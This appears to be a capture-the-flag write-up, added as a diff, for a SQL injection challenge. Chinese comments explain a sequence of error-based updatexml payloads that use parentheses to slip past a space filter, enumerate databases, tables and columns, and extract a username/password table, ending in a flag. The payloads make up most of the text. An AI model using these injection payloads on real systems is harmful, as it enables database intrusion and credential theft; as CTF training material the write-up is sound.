@@ -1,0 +1,199 @@
+#利用()绕过空格，中间的select用括号包裹
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select()
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#爆数据库名
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    database()
+                )
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#通过group_concat列出所有的数据库名，注意updatexml的报错长度限制32位
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    group_concat(schema_name)
+                )from(
+                    information_schema.schemata
+                )
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#通过right函数，从右边取30个（0x7e符号占了两个），就可以看到后面的内容
+#此时可以找到一个geek数据库
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    right(
+                        group_concat(
+                            schema_name
+                        ),30
+                    )
+                )from(
+                    information_schema.schemata
+                )
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#通过group_concat列出所有的表名，同样因为长度限制，我们用where限定列出范围为geek数据库，因为空格过滤，要用括号绕过的话，需要用到like语句指定table_schema为geek
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    group_concat(table_name)
+                )from(
+                    information_schema.tables
+                )where(
+                    table_schema
+                )like(
+                    'geek'
+                )
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#用上一步同样的方法列出所有H4rDsq1数据表的字段名
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    group_concat(column_name)
+                )from(
+                    information_schema.columns
+                )where(
+                    table_name
+                )like(
+                    'H4rDsq1'
+                )
+            ),
+            0x7e),
+        1
+    )
+)%23
+```
+
+#通过正常的查询语句select group_concat(id,"~",username,"~",password) from geek.H4rDsq1，使用group_concat连接三个字段的内容，可以看到flag在password字段内但超过长度限制
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    group_concat(
+                        id,
+                        "~",
+                        username,
+                        "~",
+                        password
+                    )
+                )from(
+                    geek.H4rDsq1
+                )
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#通过right函数取后面30位
+
+```sql
+'admin'or(
+    updatexml(
+        1,
+        concat(
+            0x7e,
+            (
+                select(
+                    right(
+                        group_concat(
+                            id,
+                            "~",
+                            username,
+                            "~",
+                            password),30
+                    )
+                )from(
+                    geek.H4rDsq1
+                )
+            ),
+            0x7e
+        ),
+        1
+    )
+)%23
+```
+
+#拼接flag两端
+
+#flag{1e409a47-b799-4ef2-95f5-85c28c84f495}
+
